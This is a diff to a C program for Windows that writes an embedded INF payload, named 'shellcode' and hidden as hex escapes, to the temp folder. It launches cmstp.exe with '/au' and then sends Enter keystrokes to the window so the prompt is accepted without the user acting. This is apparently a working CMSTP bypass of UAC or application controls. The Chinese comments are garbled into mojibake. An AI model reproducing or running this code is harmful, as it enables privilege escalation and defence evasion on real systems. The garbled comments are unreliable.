@@ -1,4 +1,4 @@
-#include<stdio.h>
+﻿#include<stdio.h>
 #include<windows.h>
 #include<tlhelp32.h>
 const char shellcode[]="\x5b\x76\x65\x72\x73\x69\x6f\x6e\x5d\x0d\x0a"
@@ -34,30 +34,32 @@ HWND GetWindowHwndByPorcessID(DWORD dwProcessID)
 {
     DWORD dwPID = 0;
     HWND hwndRet = NULL;
-    // 取得第一个窗口句柄
+    // 鍙栧緱绗竴涓獥鍙ｅ彞鏌?
     HWND hwndWindow = GetTopWindow(0);
     while (hwndWindow)
     {
         dwPID = 0;
-        // 通过窗口句柄取得进程ID
+        // 閫氳繃绐楀彛鍙ユ焺鍙栧緱杩涚▼ID
         DWORD dwTheardID = GetWindowThreadProcessId(hwndWindow, &dwPID);
         if (dwTheardID != 0)
         {   
-            printf("dwpid:%d\n",dwPID);
-            // 判断和参数传入的进程ID是否相等
+           
+            // 鍒ゆ柇鍜屽弬鏁颁紶鍏ョ殑杩涚▼ID鏄惁鐩哥瓑
             if (dwPID == dwProcessID)
             {
-                // 进程ID相等，则记录窗口句柄
+                // 杩涚▼ID鐩哥瓑锛屽垯璁板綍绐楀彛鍙ユ焺
+                printf("dwpid:%d\nhandle:%d\n",dwPID,hwndWindow);
                 hwndRet = hwndWindow;
+                
                 break;
             }
         }
-        // 取得下一个窗口句柄
+        // 鍙栧緱涓嬩竴涓獥鍙ｅ彞鏌?
         hwndWindow = GetNextWindow(hwndWindow, GW_HWNDNEXT);
     }
-    // 上面取得的窗口，不一定是最上层的窗口，需要通过GetParent获取最顶层窗口
+    // 涓婇潰鍙栧緱鐨勭獥鍙ｏ紝涓嶄竴瀹氭槸鏈€涓婂眰鐨勭獥鍙ｏ紝闇€瑕侀€氳繃GetParent鑾峰彇鏈€椤跺眰绐楀彛
     HWND hwndWindowParent = NULL;
-    // 循环查找父窗口，以便保证返回的句柄是最顶层的窗口句柄
+    // 寰幆鏌ユ壘鐖剁獥鍙ｏ紝浠ヤ究淇濊瘉杩斿洖鐨勫彞鏌勬槸鏈€椤跺眰鐨勭獥鍙ｅ彞鏌?
     while (hwndRet != NULL)
     {
         hwndWindowParent = GetParent(hwndRet);
@@ -67,7 +69,7 @@ HWND GetWindowHwndByPorcessID(DWORD dwProcessID)
         }
         hwndRet = hwndWindowParent;
     }
-    // 返回窗口句柄
+    // 杩斿洖绐楀彛鍙ユ焺
     return hwndRet;
 
 }
@@ -83,7 +85,7 @@ ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
 st.cb = sizeof(STARTUPINFO);
 ZeroMemory(&ps,sizeof(PROCESSENTRY32));
 ps.dwSize = sizeof(PROCESSENTRY32);
-// 遍历进程  
+// 閬嶅巻杩涚▼ 聽
 hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0);
 if(hSnapshot == INVALID_HANDLE_VALUE)
 {
@@ -95,17 +97,17 @@ return 0;
 }
 do
 {
-// 比较进程名  
+// 姣旇緝杩涚▼鍚?聽
 if(lstrcmpi(ps.szExeFile,szProcessName)==0)
 {
-// 找到了
+// 鎵惧埌浜?
 dwPID = ps.th32ProcessID;
 CloseHandle(hSnapshot);
 return dwPID;
 }
 }
 while(Process32Next(hSnapshot,&ps));
-// 没有找到  
+// 娌℃湁鎵惧埌 聽
 CloseHandle(hSnapshot);
 return 0;
 }
@@ -117,17 +119,28 @@ int main(){
     fp = fopen(temp, "wb");
     fputs(shellcode,fp);
     fclose(fp);
-    // system(SHELL);
-    ShellExecute(0,"open","\x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x63\x6d\x73\x74\x70\x2e\x65\x78\x65","\x2f\x61\x75 \x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x74\x65\x6d\x70\x5c\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2e\x69\x6e\x66","",SW_SHOW );
-    Sleep(5000);
+    ShellExecute(0,"open","\x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x73\x79\x73\x74\x65\x6d\x33\x32\x5c\x63\x6d\x73\x74\x70\x2e\x65\x78\x65","\x2f\x61\x75 \x63\x3a\x5c\x77\x69\x6e\x64\x6f\x77\x73\x5c\x74\x65\x6d\x70\x5c\x73\x68\x65\x6c\x6c\x63\x6f\x64\x65\x2e\x69\x6e\x66","",SW_SHOWNORMAL );
+    Sleep(1000);
     DWORD pid = GetProcessIDByName("cmstp.exe");
     HWND hwnd = GetWindowHwndByPorcessID(pid);
     printf("%d\n",pid);
     SetForegroundWindow(hwnd);
     ShowWindow(hwnd,5);
     printf("%d",hwnd);
-    
-    SendMessage(hwnd,WM_KEYDOWN,0xD,0);
-    SendMessage(hwnd,WM_KEYUP,0xD,0);
-    
+    /*HWND hwndChild=GetWindow(hwnd,GW_CHILD);
+                while(hwndChild)   
+				{   
+  					hwndChild=GetWindow(hwndChild, GW_HWNDNEXT);
+  					char childrenTEXT[256];
+  					GetWindowText(hwndChild, childrenTEXT, 256); 
+					printf("children:%d\ntitle:%s\n",hwndChild,childrenTEXT);
+					if (childrenTEXT=="确定"){
+						printf("Find THE BUTTON");
+						
+					}
+					
+ 				}
+ 				*/
+ 	PostMessage((HWND)hwnd,WM_KEYDOWN,VK_RETURN,0);
+    PostMessage((HWND)hwnd,WM_KEYUP,VK_RETURN,0);
 }
